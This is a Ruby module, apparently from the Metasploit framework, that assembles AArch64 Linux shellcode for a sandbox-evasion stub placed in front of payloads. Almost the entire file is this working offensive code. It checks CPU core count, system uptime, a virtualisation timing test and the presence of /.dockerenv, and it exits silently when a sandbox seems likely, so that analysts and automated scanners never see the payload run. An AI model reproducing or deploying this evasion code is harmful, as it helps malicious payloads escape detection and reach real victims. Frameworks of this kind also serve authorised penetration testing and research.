module Msf::Payload::Linux::Aarch64::SandboxEvasion
  def sandbox_evasion(cores = 2, uptime = 600, check_docker = true, check_virt = false)
    cores = cores.to_i
    uptime = uptime.to_i
    raise ArgumentError, 'cores must be between 1 and 65535' unless (1..65_535).cover?(cores)
    raise ArgumentError, 'uptime must be between 0 and 65535' unless (0..65_535).cover?(uptime)

    arm64_word = lambda do |opcode|
      [opcode].pack('V').unpack1('N')
    end

    entry = [
      0xff0302d1, # sub sp, sp, #0x80
    ].pack('N*')

    core_words = [
      0x000080d2, # mov x0, #0
      0x011080d2, # mov x1, #0x80
      0xe2030091, # mov x2, sp
      0x680f80d2, # mov x8, #123 (__NR_sched_getaffinity)
      0x010000d4, # svc #0
      0x4002f8b7, # tbnz x0, #63, core_done
      0xe3030091, # mov x3, sp
      0xe463208b, # add x4, sp, x0
      0xe5031f2a, # mov w5, wzr
      0x7f0004eb, # cmp x3, x4
      0xe2000054, # b.hs evaluate_cores
      0x66144038, # ldrb w6, [x3], #1
      0xa6ffff34, # cbz w6, count_core_bytes
      0xc7040051, # sub w7, w6, #1
      0xc600070a, # and w6, w6, w7
      0xa5040011, # add w5, w5, #1
      0xfcffff17, # b count_core_bits
      arm64_word.call(0x5280000a | (cores << 5)), # mov w10, #cores
      0xbf000a6b, # cmp w5, w10
      0x8a000054, # b.ge core_done
      0x000080d2, # mov x0, #0
      0xc80b80d2, # mov x8, #94 (__NR_exit_group)
      0x010000d4, # svc #0
    ].pack('N*')

    uptime_words = [
      0xe0030091, # mov x0, sp
      0x681680d2, # mov x8, #179 (__NR_sysinfo)
      0x010000d4, # svc #0
      0x0001f8b7, # tbnz x0, #63, uptime_done
      0xe30340f9, # ldr x3, [sp]
      arm64_word.call(0xd280000a | (uptime << 5)), # mov x10, #uptime
      0x7f000aeb, # cmp x3, x10
      0x8c000054, # b.gt uptime_done
      0x000080d2, # mov x0, #0
      0xc80b80d2, # mov x8, #94 (__NR_exit_group)
      0x010000d4, # svc #0
    ].pack('N*')

    timer_words = if check_virt
                    [
                      0xdf3f03d5, # isb
                      0x43e03bd5, # mrs x3, CNTVCT_EL0
                      0xdf3f03d5, # isb
                      0x881580d2, # mov x8, #172 (__NR_getpid)
                      0x010000d4, # svc #0
                      0xdf3f03d5, # isb
                      0x44e03bd5, # mrs x4, CNTVCT_EL0
                      0x840003cb, # sub x4, x4, x3
                      0x0a7d80d2, # mov x10, #1000
                      0x9f000aeb, # cmp x4, x10
                      0x8b000054, # b.lt timer_done
                      0x000080d2, # mov x0, #0
                      0xc80b80d2, # mov x8, #94 (__NR_exit_group)
                      0x010000d4, # svc #0
                    ].pack('N*')
                  else
                    ''.b
                  end

    docker_words = if check_docker
                     [
                       0xe3c585d2, # mov x3, #0x2e2f
                       0x83ecadf2, # movk x3, #0x6f64, lsl #16
                       0x636ccdf2, # movk x3, #0x6b63, lsl #32
                       0xa34ceef2, # movk x3, #0x7265, lsl #48
                       0xa4cc8dd2, # mov x4, #0x6e65
                       0xc40ea0f2, # movk x4, #0x76, lsl #16
                       0xe313bfa9, # stp x3, x4, [sp, #-16]!
                       0x000080d2, # mov x0, #0
                       0xe1030091, # mov x1, sp
                       0x020080d2, # mov x2, #0 (F_OK)
                       0x080680d2, # mov x8, #48 (__NR_faccessat)
                       0x010000d4, # svc #0
                       0x8000f8b7, # tbnz x0, #63, docker_done
                       0x000080d2, # mov x0, #0
                       0xc80b80d2, # mov x8, #94 (__NR_exit_group)
                       0x010000d4, # svc #0
                       0xff430091, # add sp, sp, #0x10
                     ].pack('N*')
                   else
                     ''.b
                   end

    pass_words = [
      0xff030291, # add sp, sp, #0x80
      0x000080d2, # mov x0, #0
      0x010080d2, # mov x1, #0
      0x020080d2, # mov x2, #0
      0x030080d2, # mov x3, #0
      0x040080d2, # mov x4, #0
      0x050080d2, # mov x5, #0
      0x060080d2, # mov x6, #0
      0x070080d2, # mov x7, #0
      0x080080d2, # mov x8, #0
    ].pack('N*')

    entry + core_words + uptime_words + timer_words + docker_words + pass_words
  end
end